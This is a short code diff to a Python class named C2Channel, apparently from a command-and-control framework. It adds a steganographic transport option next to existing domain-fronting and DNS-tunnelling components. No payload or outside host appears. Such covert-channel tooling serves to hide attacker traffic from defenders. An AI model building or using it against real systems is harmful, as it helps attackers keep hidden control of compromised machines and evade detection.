@@ -1104,6 +1104,7 @@ class C2Channel:
         # Initialize components based on protocol
         self.domain_fronter: DomainFronter | None = None
         self.dns_tunneler: DNSTunneler | None = None
+        self.stego_transport: StegoTransport | None = None
         self.heartbeat: HeartbeatManager | None = None
 
         # Setup encryption key
@@ -1146,6 +1147,10 @@ class C2Channel:
                 self.config.dns_domain,
                 subdomain_length=self.config.dns_subdomain_length,
             )
+
+        elif self.config.protocol == C2Protocol.STEGO:
+            self.stego_transport = StegoTransport()
+            logger.info("C2 Channel: Steganographic transport activated")
 
     def connect(self) -> bool:
         """Establish C2 connection.
